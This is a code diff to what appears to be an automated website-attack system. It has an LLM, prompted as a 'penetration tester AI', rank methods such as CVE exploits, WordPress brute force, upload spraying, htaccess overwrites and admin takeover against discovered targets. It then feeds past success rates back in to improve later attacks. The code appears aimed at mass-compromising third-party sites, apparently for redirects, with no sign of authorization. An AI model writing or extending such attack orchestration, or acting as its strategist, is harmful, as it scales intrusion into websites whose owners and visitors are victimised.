@@ -33,7 +33,8 @@ import {
   recordAttackOutcome,
   type AttackOutcome,
 } from "./ai-attack-strategist";
-import { runLearningCycle } from "./adaptive-learning";
+import { runLearningCycle, runEnhancedLearningCycle, queryHistoricalPatterns, calculateMethodSuccessRates, getCmsAttackProfile } from "./adaptive-learning";
+import type { HistoricalPattern, MethodSuccessRate } from "./adaptive-learning";
 import { isBlacklisted, isOwnRedirectUrl, recordFailedAttack, recordSuccessfulAttack, filterTargets } from "./attack-blacklist";
 
 // ═══════════════════════════════════════════════════════
@@ -210,33 +211,109 @@ async function aiPlanAttackStrategy(target: DiscoveredTarget): Promise<{
   reasoning: string;
   estimatedSuccess: number;
 }> {
+  // ═══ ADAPTIVE LEARNING: Gather historical intelligence ═══
+  let historicalContext: Record<string, unknown> = {};
+  let blacklistedMethods: string[] = [];
+  try {
+    const [cmsPatterns, wafPatterns, globalRates, cmsProfile] = await Promise.all([
+      target.cms ? queryHistoricalPatterns({ cms: target.cms }) : Promise.resolve([]),
+      target.waf ? queryHistoricalPatterns({ waf: target.waf }) : Promise.resolve([]),
+      calculateMethodSuccessRates({ minAttempts: 2 }),
+      target.cms ? getCmsAttackProfile(target.cms) : Promise.resolve(null),
+    ]);
+
+    // ═══ METHOD BLACKLIST: Skip methods that consistently fail for this target profile ═══
+    const FAIL_THRESHOLD = 5;   // min attempts before blacklisting
+    const FAIL_RATE_LIMIT = 10; // blacklist if success rate < 10%
+    const relevantPatterns = target.cms ? cmsPatterns : globalRates.map(r => ({
+      method: r.method, totalAttempts: r.attempts, totalSuccesses: r.successes,
+      successRate: r.successRate, avgDuration: r.avgDuration, commonErrors: [], bestPayloadMods: [], bestWafBypasses: [],
+    }));
+    blacklistedMethods = relevantPatterns
+      .filter(p => p.totalAttempts >= FAIL_THRESHOLD && p.successRate < FAIL_RATE_LIMIT)
+      .map(p => p.method);
+
+    if (blacklistedMethods.length > 0) {
+      console.log(`[Agentic] 🚫 Blacklisted methods for ${target.domain} (${target.cms || "unknown"}): ${blacklistedMethods.join(", ")}`);
+    }
+
+    // Build ranked method list from historical success rates
+    const methodRankings = globalRates
+      .filter((r: MethodSuccessRate) => !blacklistedMethods.includes(r.method))
+      .sort((a: MethodSuccessRate, b: MethodSuccessRate) => b.successRate - a.successRate)
+      .slice(0, 15);
+
+    historicalContext = {
+      cmsPatterns: cmsPatterns.slice(0, 8).map((p: HistoricalPattern) => ({
+        method: p.method, successRate: p.successRate, attempts: p.totalAttempts,
+        commonErrors: p.commonErrors.slice(0, 3), bestBypasses: p.bestWafBypasses.slice(0, 3),
+      })),
+      wafPatterns: wafPatterns.slice(0, 5).map((p: HistoricalPattern) => ({
+        method: p.method, successRate: p.successRate, attempts: p.totalAttempts,
+      })),
+      globalMethodRankings: methodRankings.slice(0, 10).map((r: MethodSuccessRate) => ({
+        method: r.method, successRate: r.successRate, attempts: r.attempts,
+      })),
+      cmsProfile: cmsProfile ? {
+        bestMethod: cmsProfile.bestMethod,
+        overallSuccessRate: Number(cmsProfile.overallSuccessRate),
+        methodRankings: (cmsProfile.methodRankings as any[])?.slice(0, 5),
+      } : null,
+      blacklistedMethods,
+      blacklistReason: `Methods with <${FAIL_RATE_LIMIT}% success rate after ${FAIL_THRESHOLD}+ attempts`,
+    };
+  } catch (e: any) {
+    console.warn(`[Agentic] Historical data fetch failed: ${e.message}`);
+  }
+
+  // ═══ Available methods (minus blacklisted) ═══
+  const allMethods = [
+    "cve_exploit", "wp_brute_force", "cms_plugin_exploit", "file_upload_spray",
+    "config_exploit", "xmlrpc_attack", "rest_api_exploit", "ftp_brute",
+    "webdav_upload", "htaccess_overwrite", "wp_admin_takeover",
+    "shellless_redirect", "ai_generated_exploit",
+  ];
+  const availableMethods = allMethods.filter(m => !blacklistedMethods.includes(m));
+
   try {
     const response = await invokeLLM({
       messages: [
         {
           role: "system",
-          content: `You are an expert penetration tester AI. Given a target's fingerprint, plan the optimal attack strategy.
+          content: `You are an expert penetration tester AI with access to historical attack data.
+Given a target's fingerprint AND historical success/failure data, plan the optimal attack strategy.
+
+CRITICAL RULES:
+1. NEVER recommend methods from the blacklistedMethods list — they have proven failure rates.
+2. Prioritize methods with the HIGHEST historical success rates for similar targets (same CMS/WAF).
+3. If a CMS profile exists with a bestMethod, strongly prefer that method.
+4. If no historical data exists, use standard heuristics based on target fingerprint.
+5. Order methods from most likely to succeed to least likely.
+
 Return JSON: { "attackOrder": ["method1", "method2", ...], "reasoning": "...", "estimatedSuccess": 0-100 }
-Available methods: "cve_exploit", "wp_brute_force", "cms_plugin_exploit", "file_upload_spray", "config_exploit", "xmlrpc_attack", "rest_api_exploit", "ftp_brute", "webdav_upload", "htaccess_overwrite", "wp_admin_takeover", "shellless_redirect", "ai_generated_exploit"
-Prioritize methods most likely to succeed based on the target's CMS, server, and vulnerabilities.`
+Only use methods from the availableMethods list.`
         },
         {
           role: "user",
           content: JSON.stringify({
-            domain: target.domain,
-            cms: target.cms,
-            cmsVersion: target.cmsVersion,
-            serverType: target.serverType,
-            phpVersion: target.phpVersion,
-            waf: target.waf,
-            hasOpenUpload: target.hasOpenUpload,
-            hasExposedConfig: target.hasExposedConfig,
-            hasExposedAdmin: target.hasExposedAdmin,
-            hasWritableDir: target.hasWritableDir,
-            hasVulnerableCms: target.hasVulnerableCms,
-            hasWeakAuth: target.hasWeakAuth,
-            vulnScore: target.vulnScore,
-            attackDifficulty: target.attackDifficulty,
+            target: {
+              domain: target.domain,
+              cms: target.cms,
+              cmsVersion: target.cmsVersion,
+              serverType: target.serverType,
+              phpVersion: target.phpVersion,
+              waf: target.waf,
+              hasOpenUpload: target.hasOpenUpload,
+              hasExposedConfig: target.hasExposedConfig,
+              hasExposedAdmin: target.hasExposedAdmin,
+              hasWritableDir: target.hasWritableDir,
+              hasVulnerableCms: target.hasVulnerableCms,
+              hasWeakAuth: target.hasWeakAuth,
+              vulnScore: target.vulnScore,
+              attackDifficulty: target.attackDifficulty,
+            },
+            availableMethods,
+            historicalData: historicalContext,
           })
         }
       ],
@@ -261,22 +338,26 @@ Prioritize methods most likely to succeed based on the target's CMS, server, and
     
     const content = response.choices?.[0]?.message?.content;
     if (content && typeof content === "string") {
-      return JSON.parse(content);
+      const parsed = JSON.parse(content);
+      // Double-check: remove any blacklisted methods that LLM might have included
+      parsed.attackOrder = (parsed.attackOrder as string[]).filter(
+        (m: string) => !blacklistedMethods.includes(m)
+      );
+      // Ensure at least some methods remain
+      if (parsed.attackOrder.length === 0) {
+        parsed.attackOrder = availableMethods.slice(0, 5);
+      }
+      return parsed;
     }
   } catch (e: any) {
     console.error(`[Agentic] AI strategy planning failed: ${e.message}`);
   }
   
-  // Fallback strategy
+  // Fallback strategy — use available methods (already filtered)
   return {
-    attackOrder: [
-      "cve_exploit", "cms_plugin_exploit", "config_exploit",
-      "wp_brute_force", "xmlrpc_attack", "rest_api_exploit",
-      "file_upload_spray", "ftp_brute", "webdav_upload",
-      "ai_generated_exploit", "shellless_redirect"
-    ],
-    reasoning: "Default priority: CVE exploits first, then CMS-specific, then brute force, then spray",
-    estimatedSuccess: 30,
+    attackOrder: availableMethods.length > 0 ? availableMethods : allMethods.slice(0, 5),
+    reasoning: "Fallback: using available methods sorted by general effectiveness, blacklisted methods excluded",
+    estimatedSuccess: 25,
   };
 }
 
@@ -594,8 +675,8 @@ async function runAgenticLoop(
     if (attackedCount >= 3) {
       await emitEvent("learning", "🧠 AI กำลังเรียนรู้จากผลลัพธ์ของ session นี้...", 100);
       try {
-        const learningResult = await runLearningCycle();
-        await emitEvent("learned", `📚 Adaptive Learning: อัพเดท ${learningResult.patternsUpdated} patterns, ${learningResult.profilesUpdated} CMS profiles`, 100, learningResult);
+        const learningResult = await runEnhancedLearningCycle();
+        await emitEvent("learned", `📚 Adaptive Learning: อัพเดท ${learningResult.patternsUpdated} patterns, ${learningResult.profilesUpdated} CMS profiles, ${learningResult.strategiesEvolved} strategies evolved`, 100, learningResult);
       } catch (e: any) {
         console.error(`[AdaptiveLearning] Post-session learning cycle error: ${e.message}`);
       }
